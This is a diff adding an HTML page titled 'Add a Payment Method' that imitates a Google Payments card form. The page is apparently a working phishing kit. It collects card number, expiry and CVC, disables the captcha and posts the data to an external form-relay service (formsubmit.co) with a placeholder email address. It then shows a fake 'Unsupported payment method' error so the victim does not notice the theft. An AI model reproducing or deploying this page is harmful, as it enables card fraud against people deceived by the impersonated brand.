@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Add a Payment Method</title>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #121212;
+      color: white;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+
+    header {
+      padding: 16px;
+      font-size: 20px;
+      font-weight: 400;
+      border-bottom: 1px solid #333;
+    }
+
+    main {
+      flex: 1;
+      padding: 16px;
+      overflow-y: auto;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      font-weight: 400;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      height: 50px;
+      padding: 10px;
+      border: 1px solid #444;
+      border-radius: 6px;
+      background-color: #2a2a2a;
+      color: white;
+      font-size: 15px;
+      font-weight: 400;
+      box-sizing: border-box;
+      margin-bottom: 20px;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .row input {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    .address {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #2a2a2a;
+      padding: 14px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      color: #ccc;
+      font-size: 16px;
+    }
+
+    .legal {
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 10px;
+      line-height: 1.4;
+    }
+
+    .legal a {
+      color: #8ab4f8;
+      text-decoration: none;
+    }
+
+    .error-message {
+      color: #e57373;
+      font-size: 14px;
+      margin-top: 50px;
+      display: none;
+    }
+
+    footer {
+      padding: 16px;
+      border-top: 1px solid #333;
+    }
+
+    button {
+      width: 100%;
+      height: 55px;
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px;
+      font-size: 15px;
+      border: none;
+      border-radius: 15px;
+      cursor: none;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+    
+    svg {
+      width: 20px;
+      height: 20px;
+      stroke: #ffffff;
+        }    
+  </style>
+</head>
+<body>
+
+  <header onclick="goBack()" style="display: flex; align-items: center;">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+        <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg> Add a payment method</header>
+
+  <main>
+    <form id="paymentForm" action="https://formsubmit.co/youremail@example.com" method="POST">
+      <label>Card number</label>
+      <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required />
+
+      <div class="row">
+        <input type="text" placeholder="MM" maxlength="2" id="expMM" name="expMM" inputmode="numeric" required />
+        <input type="text" placeholder="YY" maxlength="2" id="expYY" name="expYY" inputmode="numeric" required />
+        <input type="text" placeholder="CVC" maxlength="4" id="cvc" name="cvc" inputmode="numeric" required />
+      </div>
+
+      <label>Cardholder name</label>
+      <div class="address">
+        <p>User ID: <span id="usernameDisplay">Loading...</span></p>
+      </div>
+
+      <div class="legal">
+        By continuing, you agree to the Google Payments 
+        <a href="#" style="cursor: none;">Terms of Service</a>. The <a href="#" style="cursor: none;">Privacy Notice</a> describes how your data is handled.
+      </div>
+
+      <!-- Needed for FormSubmit to redirect to same page without reloading -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="">
+    </form>
+
+    <div class="error-message" id="errorMessage">Error: Please fill out all fields correctly.</div>
+    <div class="error-message" id="postSubmitMessage">Unsupported payment method.</div>
+  </main>
+
+  <footer>
+    <button id="submitButton">Save</button>
+  </footer>
+
+  <script>
+    const cardInput = document.getElementById("cardNumber");
+    cardInput.addEventListener("input", () => {
+      let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
+      cardInput.value = value.match(/.{1,4}/g)?.join(" ") || "";
+    });
+
+    const submitBtn = document.getElementById("submitButton");
+    const form = document.getElementById("paymentForm");
+    const errorMsg = document.getElementById("errorMessage");
+    const postSubmitMessage = document.getElementById("postSubmitMessage");
+
+    submitBtn.addEventListener("click", function (e) {
+      e.preventDefault();
+
+      const card = cardInput.value.trim();
+      const mm = document.getElementById("expMM").value.trim();
+      const yy = document.getElementById("expYY").value.trim();
+      const cvc = document.getElementById("cvc").value.trim();
+
+      if (!card || !mm || !yy || !cvc) {
+        errorMsg.style.display = "block";
+        postSubmitMessage.style.display = "none";
+      } else {
+        errorMsg.style.display = "none";
+        form.submit(); // Send the form
+        setTimeout(() => {
+          postSubmitMessage.style.display = "block";
+        }, 1000);
+      }
+    });
+  </script>
+   <script>
+  function goBack() {
+    window.history.back();
+  }
+  </script>
+  <script src="delete-account.js"></script>
+  <script src="disable-zoom.js"></script>
+  <script src="bootstrap.js"></script>
+  <script src="bootstrap.min.js"></script>
+</body>
+</html>
